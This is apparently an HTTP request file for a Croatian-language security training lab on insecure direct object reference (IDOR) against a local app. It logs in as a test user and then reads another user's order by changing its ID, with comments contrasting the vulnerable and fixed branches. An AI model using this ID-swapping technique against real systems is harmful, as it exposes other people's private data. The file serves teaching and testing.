### Lab01 – IDOR (Broken Access Control)
@host = http://localhost:8000
# Token kopiraj iz odgovora na login u varijablu @token.
@token = PASTE_TOKEN

### 1. Prijava kao ana (kopiraj "token" iz odgovora u @token)
POST {{host}}/api/auth/login
Content-Type: application/json

{"username": "ana", "password": "Ana123!"}

### 2. Legitimno: ana dohvaca VLASTITU narudzbu 1001 (ocekivano 200)
GET {{host}}/api/lab01/orders/1001
Authorization: Bearer {{token}}

### 3. EKSPLOATACIJA: ana dohvaca MARKOVU narudzbu 1003
# Ranjivo (main): 200 + tudi podaci. Popravljeno (rjesenja): 404.
GET {{host}}/api/lab01/orders/1003
Authorization: Bearer {{token}}

### 4. Bez tokena -> 401
GET {{host}}/api/lab01/orders/1001
